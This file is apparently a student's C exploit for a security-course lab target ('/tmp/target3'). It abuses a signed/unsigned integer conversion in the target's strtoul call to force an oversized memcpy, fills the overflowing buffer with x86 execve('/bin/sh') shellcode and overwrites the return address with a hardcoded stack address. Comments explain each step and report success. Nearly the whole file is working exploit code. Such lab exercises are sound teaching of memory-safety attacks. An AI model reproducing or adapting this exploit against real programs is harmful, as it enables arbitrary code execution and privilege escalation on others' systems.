#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

// need 2808
// sizeof widget_t is 56 bytes
// butts <-- butts?


// I'm pretty sure that the vulnerability has to do with line 47 of target3
// line 47: count = (int)strtoul(argv[1], &in, 10);
//
// strtoul returns an unsigned int long, but count receives it as a signed int 
// we can probably use this for l337 h4x0r1ng


struct widget_t {
  long double p;
  double x;
  double y;
  unsigned long a;
  unsigned long b;
  int count;
  double t;
  double q;
};

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[2820] = "-1764004375,";  //signed int to read 2808 bytes when passed in memcpy(), takes 12 bytes, next empty mem addr is buf[12]
  char sh[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

  int i = 12;
  for (i; i < 2816; i++){
  	if(i < sizeof(sh) + 11){
		buf[i] = sh[i-12];
	}
	else {
  		buf[i] = '\xff';
	} 
	}
	buf[2816] = '\x68';
	buf[2817] = '\xe8';  //this is mem addr where shell script starts
	buf[2818] = '\xff';
	buf[2819] = '\xbf';
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
// Shell code begins at 0xbfffe868
// Got it working!
